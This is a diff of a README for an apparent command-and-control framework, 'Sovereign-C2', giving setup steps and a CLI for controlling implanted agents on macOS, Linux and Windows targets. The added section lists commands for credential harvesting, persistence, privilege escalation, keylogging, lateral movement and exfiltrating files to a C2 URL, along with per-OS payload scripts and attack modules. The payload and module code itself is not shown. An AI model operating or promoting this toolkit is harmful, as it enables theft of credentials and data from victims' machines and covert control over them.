@@ -15,53 +15,79 @@ This framework provides advanced post-exploitation capabilities with a focus on 
 - Python 3.x
 - Virtualenv (recommended)
 
-## Setup
+### Installation and Setup
 
-1. **Clone the Repository**
-   git clone https://github.com/yourusername/Sovereign-C2.git
-   cd Sovereign-C2
+1. Clone the Repository
+   git clone https://github.com/4lph4-01/share
+   cd your-repo-directory
 
-2. **Create and Activate Virtual Environment**
+2. Create a Virtual Environment
    python -m venv venv
    source venv/bin/activate  # On Windows, use `venv\Scripts\activate`
 
-3. **Install Dependencies**
+3. Install Dependencies
    pip install -r requirements.txt
 
-## Running the Server
+4. Prepare Payloads (If necessary)
+   Ensure your payload scripts are in the `payloads` directory:
+   - payloads/macos_payload.sh
+   - payloads/linux_payload.sh
+   - payloads/windows_payload.ps1
 
-Ensure all scripts are permissioned from root. /  chmod +x *.* in the root of sovereingn-c2
+### Running the C2 Server
 
-### Windows
+   python c2_server.py
 
-1. **Run the script on the target Windows machine (with administrator privileges)**
-   .\payloads\windows_payload.ps1
+### CLI Usage
 
-## Using the CLI
+1. List Agents
+   python cli.py list-agents
 
-1. **List Agents**
-   python cli/cli.py list-agents
+2. Deploy Payload
+   python cli.py deploy-payload <agent_type>
+   Replace <agent_type> with macos, linux, or windows.
 
-2. **Deploy Payload**
-   python cli/cli.py deploy-payload <agent_type>
-   # Example: python cli/cli.py deploy-payload windows
+3. Select and Send Commands to an Agent
+   python cli.py select-agent
+   You can specify the agent ID directly or choose from a list of available agents.
 
-3. **Select and Send Command to Agent**
-   python cli/cli.py select-agent <AgentID>
+4. Generate Report
+   python cli.py generate-report
 
-4. **Generate Report**
-   python cli/cli.py generate-report
+5. Send a Specific Command
+   python cli.py send-command <agent_id> <command>
 
-## Example Commands
+### Supported Commands
 
-- `Get-ComputerInfo`
-- `Get-Process`
-- `Get-Service`
-- `Test-Connection www.example.com`
-- `Get-EventLog -LogName Application -Newest 10`
+Credential Harvesting
+   python cli.py send-command <agent_id> cred_harvest
 
-## Contributing
-Contributions are welcome! Please submit a pull request or open an issue to discuss any changes or improvements.
+Persistence
+   python cli.py send-command <agent_id> persistence
 
-## License
-This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
+Privilege Escalation
+   python cli.py send-command <agent_id> priv_escalation
+
+Reconnaissance
+   python cli.py send-command <agent_id> reconnaissance
+
+Data Exfiltration
+   python cli.py send-command <agent_id> exfiltrate <file_path> <c2_url>
+   Replace <file_path> and <c2_url> with the actual file path and C2 URL.
+
+Keylogging
+   python cli.py send-command <agent_id> keylogging
+
+Lateral Movement
+   python cli.py send-command <agent_id> lateral_movement
+
+### Modules Directory Structure
+Ensure you have a modules directory with the following structure and content:
+modules/
+    cred_harvest.py
+    persistence.py
+    priv_escalation.py
+    reconnaissance.py
+    exfiltration.py
+    keylogging.py
+    lateral_movement.py
